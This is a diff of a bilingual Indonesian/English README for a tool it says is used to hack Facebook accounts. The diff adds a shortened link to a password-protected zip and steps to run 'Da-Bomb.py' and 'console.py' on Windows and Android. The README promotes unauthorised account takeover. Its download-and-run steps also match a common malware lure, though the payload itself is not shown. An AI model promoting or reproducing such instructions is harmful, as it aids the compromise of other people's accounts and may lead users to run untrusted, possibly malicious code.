@@ -101,7 +101,7 @@ Used To Hack Facebook Accounts Here: https://rb.gy/wjtavj
 ### Download, setup, and usage For Windows
 * Harus Sudah `Install Python3` Didalam Sistem Operasi Kalian
 * Harus Sudah Install pip3 Dan Module Request Python
-* Download File Zip Disini :
+* Download File Zip Disini : https://rb.gy/di2scw
 * Masukan Password Dan Ketik `Python3 Da-Bomb.py` DiCMD
 * Dan Jika Berhasil , Silahkan Kalian Ketik `python3 console.py`
 
@@ -113,6 +113,11 @@ Used To Hack Facebook Accounts Here: https://rb.gy/wjtavj
 * And if successful, please type `python3 console.py`
 
 ***
+
+<p align="center">
+<img src="https://user-images.githubusercontent.com/66542572/90572694-e2115f00-e1de-11ea-83fd-8b3f4251e77e.png"  />
+</p>
+
 
 ### Download, setup, and usage For Android
 * Download Aplikasi Termux Di playstore
@@ -146,4 +151,4 @@ Used To Hack Facebook Accounts Here: https://rb.gy/wjtavj
 * If It Has Been Installed Successfully, Please Type `chmod + x console` Then After That Type`. / Console` And Enter!
 
 ### EXIT [ ? ]
-* Tutorial Cara Menggunakan Tools Nya Bisa Kalian Check Disini : https://shorturl.at/tCLW9
+* Tutorial Cara Menggunakan Tools Nya Bisa Kalian Check Disini : https://shorturl.at/pBEL5
